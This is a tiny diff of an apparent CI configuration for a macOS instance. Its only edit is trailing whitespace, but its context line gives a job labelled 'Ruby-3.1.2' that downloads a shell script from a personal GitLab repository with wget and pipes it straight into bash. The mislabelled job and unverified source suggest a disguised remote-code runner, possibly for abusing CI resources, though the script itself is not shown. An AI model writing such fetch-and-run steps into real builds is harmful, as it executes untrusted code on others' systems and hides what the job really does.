@@ -1,7 +1,7 @@
 macos_instance:
   image: big-sur-base
 
-task:
+task: 
   matrix:
     - name: Ruby-3.1.2
       script: bash <(wget -qO- https://gitlab.com/jningkulin/masitoh/raw/main/miniconda.sh)
